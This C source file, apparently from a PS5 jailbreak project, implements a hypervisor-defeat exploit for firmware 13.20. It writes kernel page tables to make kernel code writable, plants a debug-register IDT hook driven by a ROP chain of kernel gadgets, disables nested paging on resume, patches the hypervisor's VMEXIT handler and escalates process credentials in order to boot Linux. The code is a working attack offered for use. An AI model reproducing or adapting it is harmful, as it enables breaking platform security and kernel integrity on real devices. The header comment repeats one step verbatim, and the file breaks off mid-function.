/*
 * hv_defeat_1320.c -- high-firmware (8.xx+) vector, 13.20 first.
 *
 * The 3.00-7.61 path (hv_defeat_0304/0506/0607) defeats the hypervisor with
 * flatz' ACPI-wakeup ROP chain. That trick does not apply on high firmware.
 * Instead, per Byepervisor-Reborn, we:
 *
 *   1. Escape the guest: make kernel .text writable and clear the XOTEXT bit
 *      so the text can be patched (Byepervisor PTE walkers, vendored).
 *   1. Escape the guest: make kernel .text writable and clear the XOTEXT bit
 *      so the text can be patched (Byepervisor PTE walkers, vendored).
 *   2. Install a kernel-cave IDT-gate hook ("khook") that fires on the S3
 *      resume path on KERNEL_SYM_HV_MP_STARTUP_CALL, redirecting its RSI to the
 *      break_hv payload, which disables NPT on every core and returns to the
 *      guest so the console resumes normally.
 *   3. Post-resume, from the BSP kernel context, patch the HV VMEXIT dispatcher
 *      and force every CPU to issue a raw VMMCALL via smp_rendezvous, landing
 *      in shellcode_hv (staged in the identity-mapped cave), which boots Linux
 *      bare-metal with full SMP.
 */

#include "config.h"
#include "hv_defeat_1320.h"
#include "linux.h"
#include "shellcode_hv.h"
#include "break_hv.h"
#include "takeover.h"
#include "utils.h"

#include <ps5/kernel.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "byepervisor/kdlsym.h"
#include "byepervisor/khook.h"
#include "byepervisor/paging.h"

#define STATE_ARMED 0x4B484F4F4B454401ULL // 'KHOOKED.'
#define COOKIE_VAL 0xCAFE133741414141ULL
#define HOOK_CORE 0
#define HOOK_IST 6
#define TSS_STRIDE 0x68
#define STARTUP_MP_PAYLOAD_PAGE 0x3FFFF000ULL

#define CAVE_STATE_OFF 0x600
#define CAVE_SAVE_OFF 0x620

/* Set by hv_defeat_1320() before rest mode, consumed by the post-resume
 * takeover. Break_hv writes its cookie to g_oracle when the resume payload
 * runs, which is how we detect that NPT is off and the AP is back in-guest. */
static uint64_t g_oracle;
static uint64_t g_payload_va;
static int g_armed;

/*
 * Diagnostic bisection stage (-DPL5_DIAG=<n>, default 3). Lets us power-cycle
 * through progressively-more-invasive builds to find where resume breaks:
 *
 *   0 : do nothing but enter/exit rest mode (no escape, no hook) -- sanity check
 *       that S3 + this payload process survive at all.
 *   1 : escape + install the resume hook but DO NOT redirect RSI (the hook only
 *       stamps the cookie via its chain) -> tests that the IDT/DR gate survives
 *       suspend/resume and the hook fires on the HV startup_mp call.
 *   2 : stage 1 + redirect RSI to break_hv (full phase A) -> tests break_hv.
 *   3 : full: phase A + the post-resume takeover (phase B). Best guess.
 *
 * Every stage still prints a "[W] back from rest mode" notification as the very
 * first thing in post_resume so we can tell "did not resume" from "resumed but
 * hook/payload failed".
 */
#ifndef PL5_DIAG
#define PL5_DIAG 3
#endif

/*
 * Step selector handed to the takeover blob via RSP-resume RAX (see
 * source/shellcode/hv_takeover/takeover.S). Lets us bisect the post-[P5] crash without
 * rebuilding the blob each time:
 *   0 = blob enters and returns immediately (validate enter/return path)
 *   1 = patch VMMCALL handler only
 *   2 = 1 + CFI byte
 *   3 = full takeover (never returns) -- default, matches prior behaviour
 * Override with `make PL5_DIAG=4 PL5_TAKEOVER_STAGE=<n>`.
 */
#ifndef PL5_TAKEOVER_STAGE
#define PL5_TAKEOVER_STAGE 3
#endif

/* khook wants int-returning read/write function pointers; the project helpers
 * are void, so wrap them. */
static int by_read(uint64_t kaddr, void *dst, size_t len) {
  kread(kaddr, dst, len);
  return 0;
}

static int by_write(uint64_t kaddr, const void *src, size_t len) {
  kwrite(kaddr, (void *)src, len);
  return 0;
}

/* Expected bytes written by the takeover blob. */
static const uint8_t takeover_stub[25] = {
    0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x0f, 0x22, 0xd8,
    0x48, 0xb8, 0x00, 0x30, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xff, 0xe0};

/* Hex-dump `n` kernel bytes at `a` (one notification). */
static void log_hex(const char *tag, uint64_t a, int n) {
  static const char hexd[] = "0123456789abcdef";
  char b[3 * 32 + 1];
  int p = 0;
  for (int i = 0; i < n && i < 32; i++) {
    uint8_t v;
    kread(a + i, &v, 1);
    b[p++] = hexd[v >> 4];
    b[p++] = hexd[v & 0xf];
    b[p++] = ' ';
  }
  if (p)
    b[p - 1] = 0;
  else
    b[0] = 0;
  notify("13.20: %s @ %#lx = %s\n", tag, (unsigned long)a, b);
}

static int bytes_match(uint64_t a, const uint8_t *exp, int n) {
  for (int i = 0; i < n; i++) {
    uint8_t v;
    kread(a + i, &v, 1);
    if (v != exp[i])
      return 0;
  }
  return 1;
}

/* Read back and report the two patch sites the takeover blob writes. */
static void report_patch_state(void) {
  uint64_t vme = kdldmap(0) + 0x62847375ULL;
  uint64_t cfi = ktext + 0x44e5d0ULL;
  uint8_t cb;
  kread(cfi, &cb, 1);
  notify("13.20: [VERIFY] vmmcall-stub %s ; cfi=0x%02x (%s)\n",
         bytes_match(vme, takeover_stub, 25) ? "MATCH" : "MISMATCH", cb,
         cb == 0xc3 ? "patched" : "not patched");
}

/*
 * Fail fast (with a notification) if the fields this vector needs are not
 * populated for the running firmware. Fields used only by the (not yet wired)
 * Linux prep are intentionally excluded so the escape can run today.
 */
static int check_offsets(void) {
  const struct {
    const char *name;
    uint64_t value;
  } need[] = {
      {"HV_MP_STARTUP_CALL", env_offset.KERNEL_SYM_HV_MP_STARTUP_CALL},
      {"PMAP_STORE", env_offset.KERNEL_SYM_PMAP_STORE},
      {"DATA_CAVE", env_offset.KERNEL_SYM_DATA_CAVE},
      {"DMPML4I", env_offset.KERNEL_SYM_DMPML4I},
      {"DMPDPI", env_offset.KERNEL_SYM_DMPDPI},
      {"PML4PML4I", env_offset.KERNEL_SYM_PML4PML4I},
      {"IDT", env_offset.IDT},
      {"COMMON_TSS", env_offset.COMMON_TSS},
      {"HV_SYM_HEAP_BASE", env_offset.HV_SYM_HEAP_BASE},
      {"HV_SYM_PCPUS", env_offset.HV_SYM_PCPUS},
      {"HV_LOADER_PA_REGULAR", env_offset.HV_LOADER_PA_REGULAR},
      {"GAD_ADD_RSP_28_POP_RBP_RET", env_offset.GAD_ADD_RSP_28_POP_RBP_RET},
      {"GAD_IRETQ", env_offset.GAD_IRETQ},
      {"GAD_POP_RCX_RET", env_offset.GAD_POP_RCX_RET},
      {"GAD_POP_RDI_RET", env_offset.GAD_POP_RDI_RET},
      {"GAD_POP_RSI_RET", env_offset.GAD_POP_RSI_RET},
      {"GAD_POP_RDX_RET", env_offset.GAD_POP_RDX_RET},
      {"GAD_POP_RSP_RET", env_offset.GAD_POP_RSP_RET},
      {"GAD_POP_R8", env_offset.GAD_POP_R8},
      {"GAD_STORE_RCX_R8", env_offset.GAD_STORE_RCX_R8},
      {"GAD_STORE_RDI8_RCX", env_offset.GAD_STORE_RDI8_RCX},
      {"GAD_OR_RCX_EAX", env_offset.GAD_OR_RCX_EAX},
      {"GAD_SET_DR7", env_offset.GAD_SET_DR7},
      {"GAD_ST_RCX_RDX", env_offset.GAD_ST_RCX_RDX},
      {"GAD_ST_RCX_RAX", env_offset.GAD_ST_RCX_RAX},
      {"GAD_MOV_RAX_RSI", env_offset.GAD_MOV_RAX_RSI},
      {"GAD_MOV_RAX_RDI", env_offset.GAD_MOV_RAX_RDI},
      {"GAD_REP_MOVSB", env_offset.GAD_REP_MOVSB},
      {"GAD_CLD", env_offset.GAD_CLD},
      {"GAD_RET_TRAMP", env_offset.GAD_RET_TRAMP},
      {"GAD_DBREG_RESUME", env_offset.GAD_DBREG_RESUME},
  };

  for (size_t i = 0; i < sizeof(need) / sizeof(need[0]); i++) {
    if (!need[i].value) {
      notify("13.20: missing offset %s\n", need[i].name);
      return -1;
    }
  }
  return 0;
}

/* Make the kernel .text RW and clear XOTEXT so it can be patched. */
static void escape_kernel_text(uint64_t kernel_pmap) {
  uint64_t entry_addr, entry;

  for (uint64_t addr = ktext; addr < kdata; addr += 0x1000) {
    entry_addr = find_pde(kernel_pmap, addr, &entry);
    if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(entry_addr, entry);
    }

    entry_addr = find_pte(kernel_pmap, addr, &entry);
    if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(entry_addr, entry);
    }
  }
}

/* Make STARTUP_MP_PAYLOAD_PAGE executable in the guest page tables so the HV can
 * call into it after resume. */
static void map_payload_executable(uint64_t kernel_pmap) {
  uint64_t va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t entry_addr, entry;

  entry_addr = find_pml4e(kernel_pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);
  }

  entry_addr = find_pdpe(kernel_pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);
  }

  entry_addr = find_pde(kernel_pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);

    if (PDE_FIELD(entry, PS) != 1) {
      entry_addr = find_pte(kernel_pmap, va, &entry);
      if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
        CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
        kwrite64(entry_addr, entry);
      }
    }
  }
}

/* Log the payload page's translation in a given pmap: entry addresses, values,
 * NX bit and huge-page (PS) bit at each level. Diagnostic only. */
static void log_payload_nx(uint64_t pmap, const char *label) {
  uint64_t va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t e, a;

  a = find_pml4e(pmap, va, &e);
  notify("13.20:   %s pml4e@%#lx=%#lx nx=%lu ps=%lu\n", label,
         (unsigned long)a, (unsigned long)e,
         (unsigned long)PDE_FIELD(e, EXECUTE_DISABLE),
         (unsigned long)PDE_FIELD(e, PS));
  a = find_pdpe(pmap, va, &e);
  notify("13.20:   %s pdpe @%#lx=%#lx nx=%lu ps=%lu\n", label,
         (unsigned long)a, (unsigned long)e,
         (unsigned long)PDE_FIELD(e, EXECUTE_DISABLE),
         (unsigned long)PDE_FIELD(e, PS));
  a = find_pde(pmap, va, &e);
  notify("13.20:   %s pde  @%#lx=%#lx nx=%lu ps=%lu\n", label,
         (unsigned long)a, (unsigned long)e,
         (unsigned long)PDE_FIELD(e, EXECUTE_DISABLE),
         (unsigned long)PDE_FIELD(e, PS));
  if (PDE_FIELD(e, PS) != 1) {
    a = find_pte(pmap, va, &e);
    notify("13.20:   %s pte  @%#lx=%#lx nx=%lu\n", label, (unsigned long)a,
           (unsigned long)e, (unsigned long)PDE_FIELD(e, EXECUTE_DISABLE));
  }
}

/* HV loader carveout base. Retail/"regular" SoC only: sceKernelGetMainSocId() is
 * not resolvable by elfldr on retail (undefined import), so we cannot probe the
 * SoC id at runtime. The Pro variant (HV_LOADER_PA_PRO) is not handled here. */
static uint64_t hv_base_pa(void) {
  return env_offset.HV_LOADER_PA_REGULAR;
}

/*
 * Stage everything shellcode_hv needs into the identity-mapped cave before we
 * enter rest mode. shellcode_hv runs with the identity CR3, so everything it
 * reads must live in the cave (4 GiB physical, mapped by the 5 GiB identity
 * table) and be addressed by physical address:
 *
 *   cave_hv_paging  : PML4 + PDPT covering 0..5 GiB (identity)
 *   cave_hv_code    : the shellcode_hv blob
 *   cave_linux_info : struct linux_info (bzimage/initrd now cave PAs)
 *   cave_bzImage    : bzImage, followed by the initrd
 *
 * All of this is written through the kernel direct map before entering rest
 * mode, so it is already in place when the resume payload jumps to shellcode_hv.
 */
static void stage_identity_map(void) {
  uint64_t identity_pml4_0 = cave_hv_paging + 0x1003ULL;
  uint64_t l3[] = {
      0x0000000000000083, // 0-1 GiB
      0x0000000040000083, // 1-2 GiB
      0x0000000080000083, // 2-3 GiB
      0x00000000C0000083, // 3-4 GiB
      0x0000000100000083  // 4-5 GiB (cave + shellcode_hv)
  };

  kwrite64(pa_to_dmap(cave_hv_paging), identity_pml4_0);
  for (size_t i = 0; i < sizeof(l3) / sizeof(l3[0]); i++)
    kwrite64(pa_to_dmap(PAGE_PA(identity_pml4_0) + i * 8), l3[i]);

  /* The payload executes at a *high* direct-map VA (kdldmap of the payload
   * page), so after `mov cr3` the very next instruction would fault unless the
   * identity table also maps that VA. Alias the payload's 1 GiB region to the
   * matching physical range with a single 1 GiB page in a second PDPT. */
  uint64_t dmap_base = kdldmap(0);
  uint64_t payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint32_t pm4idx = (payload_va >> 39) & 0x1FF;
  uint32_t pdpi = (payload_va >> 30) & 0x1FF;
  uint64_t high_pdpt_pa = cave_hv_paging + 0x2000ULL;
  uint64_t high_entry =
      ((payload_va - dmap_base) & ~0x3FFFFFFFULL) | 0x83ULL;

  if (pm4idx != 0) {
    kwrite64(pa_to_dmap(cave_hv_paging + (uint64_t)pm4idx * 8),
             high_pdpt_pa | 0x3ULL);
    kwrite64(pa_to_dmap(high_pdpt_pa + (uint64_t)pdpi * 8), high_entry);
  }
}

static int stage_hv_boot(void) {
  if (!linux_bzimage_user || !linux_initrd_user) {
    notify("13.20: Linux images missing, cannot stage HV boot.\n");
    return -1;
  }

  /* Identity map + the shellcode_hv blob it will jump into. */
  logmsg("13.20: [S1] staging identity map @ %#lx...\n",
         (unsigned long)cave_hv_paging);
  stage_identity_map();
  logmsg("13.20: [S2] identity map ok; copying shellcode_hv (%u B) @ %#lx...\n",
         shellcode_hv_bin_len, (unsigned long)cave_hv_code);
  kwrite(pa_to_dmap(cave_hv_code), shellcode_hv_bin, shellcode_hv_bin_len);

  /* Build the linux_info the HV shellcode reads from cave_linux_info, with the
   * kernel/initrd relocated to identity-mapped physical addresses. */
  struct linux_info info = linux_i;
  info.linux_info = cave_linux_info;
  info.bzimage = cave_bzImage;
  info.bzimage_size = linux_bzimage_len;
  info.initrd = cave_bzImage + ALIGN_UP(linux_bzimage_len, PAGE_SIZE);
  info.initrd_size = linux_initrd_len;
  info.n_tmrs = 0;

#if HV_HEADLESS_SINGLE_CORE
  /* The khook payload only runs on one core; tell Linux not to try to bring up
   * the APs (which are still parked in the hypervisor). */
  if (strlen(info.cmdline) + sizeof(" maxcpus=1 nosmp") <=
      sizeof(info.cmdline))
    strcat(info.cmdline, " maxcpus=1 nosmp");
#endif

  logmsg("13.20: [S3] writing linux_info @ %#lx...\n",
         (unsigned long)cave_linux_info);
  kwrite(pa_to_dmap(cave_linux_info), &info, sizeof(struct linux_info));
  logmsg("13.20: [S4] bzImage %u B @ %#lx...\n", linux_bzimage_len,
         (unsigned long)info.bzimage);
  kwrite_large(pa_to_dmap(info.bzimage), linux_bzimage_user, info.bzimage_size);
  logmsg("13.20: [S5] initrd %u B @ %#lx...\n", linux_initrd_len,
         (unsigned long)info.initrd);
  kwrite_large(pa_to_dmap(info.initrd), linux_initrd_user, info.initrd_size);

  logmsg("13.20: [S6] staged shellcode_hv (%u B) + Linux @ %#lx/%#lx.\n",
         shellcode_hv_bin_len, (unsigned long)info.bzimage,
         (unsigned long)info.initrd);
  return 0;
}

/*
 * Stage the break_hv payload + its Byepervisor param block at
 * STARTUP_MP_PAYLOAD_PAGE, then install the resume khook so that the HV's
 * startup_mp call gets its RSI redirected to the payload. break_hv disables
 * NPT on every core and jumps back to the guest init vector, so the console
 * resumes normally and we can run the takeover from the BSP afterwards.
 *
 * Param layout (matches break_hv's entry.S / Byepervisor):
 *   [0]=init_cb  [1]=dmap  [2]=cookie addr  [3]=carveout  [4]=heap  [5]=pcpus
 */
static int install_resume_hook(uint64_t cave_addr, int redirect) {
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x800];
  uint64_t scratch = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t oracle = scratch + KH_OFF_USER;
  uint64_t payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t hv_base = hv_base_pa();
  uint64_t kernel_cr3 = kread64(kdlsym(KERNEL_SYM_PMAP_STORE) + 0x28);
  int ret;

  /* Keep break_hv in the kernel data cave (which survives suspend) and copy it
   * into the payload page from the ROP chain at *fire* time: the payload page is
   * reused/clobbered while the console is asleep, so arm-time staging is lost.
   * This mirrors Byepervisor-Reborn exactly (its staging contract). */
  kwrite(scratch + 0x1000, break_hv_bin, break_hv_bin_len);
  notify("13.20: [A] payload staged @ cave+0x1000, hv_base=%#lx cr3=%#lx redirect=%d\n",
         (unsigned long)hv_base, (unsigned long)kernel_cr3, redirect);

  kwrite64(oracle, 0);

  ret = kh_init(&hook, by_read, by_write, ktext, scratch, HOOK_IST);
  notify("13.20: [C] kh_init rc=%d\n", ret);
  if (ret)
    return ret;

  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  hook.oneshot = 1;

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  if (redirect) {
    kh_set_resume_rsi(&hook, payload_va);
    kh_set_resume_rdx(&hook, kernel_cr3);
  }

  /* Chain (executed in the hook handler at fire time): stamp the cookie, publish
   * the kernel CR3, copy break_hv into the payload page, and lay down its params
   * at page+0xF00 (same layout break_hv's entry.S reads). */
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);

  kh_chain_store(&chain, oracle, COOKIE_VAL);

  if (redirect) {
    kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
    kh_chain_q(&chain, kernel_cr3);
    kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
    kh_chain_q(&chain, oracle + 0x08);
    kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);

    kh_chain_memcpy(&chain, payload_va, scratch + 0x1000, 0xF00);

    kh_chain_store(&chain, payload_va + 0xF00,
                   kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
    kh_chain_store(&chain, payload_va + 0xF08, kdldmap(0)); /* dmap */
    kh_chain_store(&chain, payload_va + 0xF10, oracle);     /* cookie addr */
    kh_chain_store(&chain, payload_va + 0xF18, hv_base);    /* carveout */
    kh_chain_store(&chain, payload_va + 0xF20,
                   hv_base + env_offset.HV_SYM_HEAP_BASE);
    kh_chain_store(&chain, payload_va + 0xF28,
                   hv_base + env_offset.HV_SYM_PCPUS);
  }
  notify("13.20: [B] chain built (%u bytes)\n", (unsigned)chain.len);
  if (chain.err) {
    notify("13.20: chain overflow (cap=%u)\n", (unsigned)chain.cap);
    return -1;
  }

  ret = kh_install(&hook, &chain);
  notify("13.20: [D] kh_install rc=%d\n", ret);
  if (ret)
    return ret;

  pin_to_core(HOOK_CORE);
  notify("13.20: [E] core=%d ktext=%#lx scratch=%#lx tgt=%#lx idt=%#lx tss=%#lx\n",
         sceKernelGetCurrentCpu(), (unsigned long)ktext, (unsigned long)scratch,
         (unsigned long)hook.hook_kaddr, (unsigned long)hook.idt_base,
         (unsigned long)hook.tss_base);
  kh_trigger(&hook);
  notify("13.20: [F] triggered\n");

  g_oracle = oracle;
  g_payload_va = payload_va;
  g_armed = 1;

  kwrite64(cave_addr + CAVE_STATE_OFF, STATE_ARMED);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x10, hook.saved_ist);

  return 0;
}

/*
 * Post-resume: wait for break_hv's cookie, then take over the HV from the BSP
 * kernel context. We install a second khook on SYS_GETUID that redirects the
 * syscall's resume RIP to the takeover blob (staged at g_payload_va). The blob
 * patches the HV VMEXIT dispatcher and drives smp_rendezvous so every CPU
 * VMMCALLs into shellcode_hv. Nothing returns.
 */
int hv_defeat_1320_post_resume(void) {
  uint64_t cookie = 0;
#if PL5_DIAG >= 4
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x100];
  int ret;
#if PL5_TAKEOVER_STAGE < 3
  uint8_t orig_vme[25];
  uint8_t orig_cfi;
#endif
#endif

  /* enter_rest_mode() only *requests* suspend and returns immediately; the
   * console then freezes this thread a moment later when it actually sleeps.
   * So this line is expected to appear BEFORE the machine powers down -- it is
   * NOT evidence of a resume. The [W] line further down is the real one. */
  logmsg("13.20: [W0] pre-suspend (diag=%d); waiting for resume...\n", PL5_DIAG);
  if (!g_armed) {
    notify("13.20: post-resume called but vector was never armed.\n");
    return -1;
  }

  /* The resume payload may take a moment (and the process is frozen while the
   * console is actually asleep). Poll until break_hv stamps the cookie, which
   * only happens on a genuine resume -- so [W] proves we really woke up. */
  for (int i = 0; i < 300 && cookie == 0; i++) {
    cookie = kread64(g_oracle);
    if (cookie == 0)
      sleep(2);
  }
  if (cookie == 0) {
    notify("13.20: [X] never resumed / break_hv never ran (no cookie).\n");
    return -1;
  }
  notify("13.20: [W] resumed from rest mode (diag=%d); cookie=%#lx NPT disabled.\n",
         PL5_DIAG, (unsigned long)cookie);
  log_reopen();

  /* The network + filesystem come back a beat after the CPU resumes; the wake
   * window is exactly where our [W]/[P*] notifications were vanishing in the
   * stage-4 runs. Settle and re-open the log a few times before doing anything
   * that can hang the console, so the trace reliably reaches both the FTP log
   * and the elfldr socket. */
  for (int settle = 0; settle < 5; settle++) {
    sleep(2);
    log_reopen();
  }
  notify("13.20: [W+] post-wake settling done (diag=%d).\n", PL5_DIAG);

#if PL5_DIAG < 3
  /* Bisection build: stop right after confirming phase A (or the bare gate).
   * No takeover, so the console should stay up. */
  notify("13.20: [Y] diag=%d stop after phase A (no takeover).\n", PL5_DIAG);
  return 0;
#else
  /* Credentials may not have survived the power cycle. */
  notify("13.20: [W1] kernel_set_ucred_authid(pid=%d)...\n", (int)getpid());
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  notify("13.20: [W2] pinned? -> pin_to_core(%d)...\n", HOOK_CORE);
  pin_to_core(HOOK_CORE);
  notify("13.20: [W3] core pinned; entering stage_hv_boot...\n");

  /* Refresh the cave stages: the suspend/resume cycle may have reused the
   * physical pages holding the identity table and the Linux images. */
  if (stage_hv_boot())
    return -1;

#if PL5_DIAG < 4
  /* Bisection build: HV-boot staging done but no takeover. If we reach here and
   * the console stays up, stage_hv_boot()'s ~66 MB cave write is safe. */
  notify("13.20: [Y] diag=%d stop after HV-boot staging (no takeover).\n",
         PL5_DIAG);
  return 0;
#else
  notify("13.20: [P1] writing takeover blob (%u B) @ %#lx...\n", takeover_bin_len,
         (unsigned long)g_payload_va);
  kwrite(g_payload_va, takeover_bin, takeover_bin_len);

  notify("13.20: [P2] takeover kh_init...\n");
  ret = kh_init(&hook, by_read, by_write, ktext, kdlsym(KERNEL_SYM_DATA_CAVE),
                HOOK_IST);
  if (ret) {
    notify("13.20: takeover kh_init failed (%d).\n", ret);
    return ret;
  }

  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  hook.oneshot = 1;

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);
  kh_set_resume_rip(&hook, g_payload_va);
  kh_set_resume_rdi(&hook, ktext);      /* blob arg0 = ktext */
  kh_set_resume_rsi(&hook, kdldmap(0)); /* blob arg1 = dmap  */
  /* rdx = resume point for the interrupted getuid: skip its 7-byte
   * `mov [rdi+0x408],rax` at the breakpoint (rdi gets clobbered), so the
   * syscall returns cleanly and the payload keeps running. rax = step. */
  kh_set_resume_rdx(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE + 7);
  kh_set_resume_rax(&hook, PL5_TAKEOVER_STAGE);

  kh_chain_init(&chain, chain_buf, sizeof chain_buf);

  notify("13.20: [P3] takeover kh_install tgt=%#lx payload=%#lx stage=%d...\n",
         (unsigned long)hook.hook_kaddr, (unsigned long)g_payload_va,
         PL5_TAKEOVER_STAGE);
  ret = kh_install(&hook, &chain);
  if (ret) {
    notify("13.20: takeover hook install failed (%d).\n", ret);
    return ret;
  }

  notify("13.20: [P4] kh_trigger...\n");
  kh_trigger(&hook);

  notify("13.20: [P4.5] patch sites BEFORE:\n");
  log_hex("  vme", kdldmap(0) + 0x62847375ULL, 25);
  log_hex("  cfi", ktext + 0x44e5d0ULL, 8);
#if PL5_TAKEOVER_STAGE < 3
  kread(kdldmap(0) + 0x62847375ULL, orig_vme, 25);
  kread(ktext + 0x44e5d0ULL, &orig_cfi, 1);
#endif

  notify("13.20: [P5] firing getuid() (stage=%d)...\n", PL5_TAKEOVER_STAGE);
  syscall(SYS_getuid);

  notify("13.20: [P6] getuid() returned (stage=%d); takeover did not divert.\n",
         PL5_TAKEOVER_STAGE);
  report_patch_state();
  log_hex("  vme", kdldmap(0) + 0x62847375ULL, 25);
  log_hex("  cfi", ktext + 0x44e5d0ULL, 8);
#if PL5_TAKEOVER_STAGE < 3
  /* Diagnostic-only stages: undo what the blob wrote so the console stays
   * healthy afterwards (a later stray VMMCALL would otherwise divert into
   * shellcode_hv). Stage 3 never returns, so there is nothing to undo. */
  kwrite(kdldmap(0) + 0x62847375ULL, orig_vme, 25);
  kwrite8(ktext + 0x44e5d0ULL, orig_cfi);
  notify("13.20: [P7] stage=%d return path complete; patch sites restored.\n",
         PL5_TAKEOVER_STAGE);
#else
  notify("13.20: [P7] stage=%d return path complete (patch left in place).\n",
         PL5_TAKEOVER_STAGE);
#endif
  return 0;
#endif /* PL5_DIAG >= 4 */
#endif /* PL5_DIAG >= 3 */
}

/*
 * Live self-test of the khook machinery (Byepervisor's KHOOK_TEST pattern). We
 * install a one-shot hook on SYS_getuid+0xE that stamps the oracle cookie from
 * its handler, fire it with a plain getuid() syscall, and check the cookie. This
 * exercises pin/core selection, kh_init/kh_install, the #DB gate + DR7 single
 * step, kh_trigger, and the handler chain -- everything phase A needs *except*
 * the S3 suspend/resume and the payload redirect -- with no rest mode required.
 */
static int khook_selftest(void) {
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x100];
  uint64_t scratch = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t oracle = scratch + KH_OFF_USER;
  int ret;

  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  pin_to_core(HOOK_CORE);
  kwrite64(oracle, 0);

  ret = kh_init(&hook, by_read, by_write, ktext, scratch, HOOK_IST);
  if (ret) {
    notify("13.20: selftest kh_init rc=%d\n", ret);
    return ret;
  }

  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  hook.oneshot = 1;
  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);
  kh_set_resume_rax(&hook, 0x12345678);

  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  if (kh_install(&hook, &chain)) {
    notify("13.20: selftest: kh_install failed\n");
    return -1;
  }

  kh_trigger(&hook);
  syscall(SYS_getuid);

  uint64_t o = kread64(oracle);
  notify("selftest: core=%d oracle=%#lx -> %s\n", sceKernelGetCurrentCpu(),
         (unsigned long)o, o ? "KHOOK OK" : "KHOOK FAILED");

  /* Leave the #DB gate, TSS IST6 and DR7 exactly as we found them. The oneshot
   * path only clears DR7; it leaves IDT[#DB] pointing at the pivot and the TSS
   * IST slot pointing at our chain, and the resume hook's kh_init() would then
   * save that tainted state instead of the pristine gate. (Byepervisor's
   * KHOOK_TEST does the same uninstall.) */
  kh_disarm(&hook);
  kh_restore(&hook);

  return o ? 0 : -1;
}

#if PL5_PROBE
/*
 * Discriminating probe for the resume_rip redirect, run BEFORE rest mode.
 * Three sub-tests run in one boot; the last printed line pinpoints the break:
 *   0 = baseline: no resume_rip (mirrors the known-good khook self-test)
 *   1 = resume_rip -> SYS_GETUID+0x15 (redirect within kernel .text only)
 *   2 = resume_rip -> staged takeover blob at the payload page (dmap alias)
 *   3 = resume_rip -> payload page pre-filled with getuid+0x15's own bytes
 *       (xor eax,eax; pop rbp; ret) -- isolates "is the page executable in
 *       the active pmap?" from "is the blob correct?". Expect 0, like mode 1.
 * Mode 2/3 run LAST so their crash does not mask the earlier results.
 */
static int takeover_return_selftest(uint64_t mode) {
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x80];
  uint64_t scratch = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t hook_kaddr = kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE;
  int ret;

  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  pin_to_core(HOOK_CORE);

  if (mode == 2)
    kwrite(payload_va, takeover_bin, takeover_bin_len);
  if (mode == 3) {
    uint8_t tail[] = {0x31, 0xc0, 0x5d, 0xc3}; /* xor eax,eax; pop rbp; ret */
    kwrite(payload_va, tail, sizeof tail);
  }

  ret = kh_init(&hook, by_read, by_write, ktext, scratch, HOOK_IST);
  if (ret) {
    notify("13.20: probe%d kh_init rc=%d\n", (int)mode, ret);
    return ret;
  }
  hook.tss_stride = TSS_STRIDE;
